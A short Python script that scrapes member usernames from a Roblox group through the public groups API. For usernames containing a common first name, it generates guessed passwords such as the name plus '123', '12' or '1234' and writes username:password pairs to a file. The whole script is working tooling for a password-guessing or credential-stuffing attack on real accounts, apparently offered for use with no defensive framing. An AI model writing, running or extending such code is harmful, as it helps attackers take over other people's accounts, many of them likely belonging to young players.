import requests
import time
import random

# Group and API Parameters
groupId = 7  # PUT YOUR GROUP ID
cursor = ''  # Leave as is
limit = 100
sortOrder = 'Asc'  # Desc = Newest Players, Asc = Oldest Players
counter = 0


names = [

    "john", "michael", "james", "robert", "david", "mary", "jennifer", "linda",
    "elizabeth", "william", "richard", "charles", "joseph", "thomas", "patricia",
    "barbara", "matthew", "daniel", "christopher", "susan", "karen", "nancy",
    "margaret", "mark", "paul", "steven", "donna", "george", "kenneth", "andrew",
    "edward", "brian", "joshua", "kevin", "ronald", "kimberly", "anna", "emma",
    "olivia", "sophia", "isabella", "charlotte", "amelia", "mia", "harper", "evelyn"
]


passwords = [
    f"{name}{num}" for name in names for num in ["123", "12", "1234"]
]

def chz(data, file):
    for user in data:
        username = user['user']['username']
        # Check if the username contains any real-life name
        for name in names:
            if name in username.lower():  # Case-insensitive match
                for password in passwords:
                    if name in password:
                        # Log match to file
                        file.write(f"{username}:{password}\n")
                        print(f"{username}:{password}")


with open("output.txt", "a") as file:
    # Initial Request to Fetch User Data
    user_req = requests.get(f"https://groups.roblox.com/v1/groups/{groupId}/users?limit={limit}&sortOrder={sortOrder}")
    user_data = user_req.json()
    cursor = user_data.get("nextPageCursor")

    # Process Initial Data
    chz(user_data['data'], file)

    # Loop Through Additional Pages if Available
    while cursor:
        try:
            user_req = requests.get(f'https://groups.roblox.com/v1/groups/{groupId}/users?limit={limit}&cursor={cursor}&sortOrder={sortOrder}')
            user_data = user_req.json()
            cursor = user_data.get("nextPageCursor")

            chz(user_data['data'], file)

            counter += limit
            print(f"Progress: {counter}")

        except Exception as e:
            print(f"Error encountered: {e}")

print("Processing complete.")
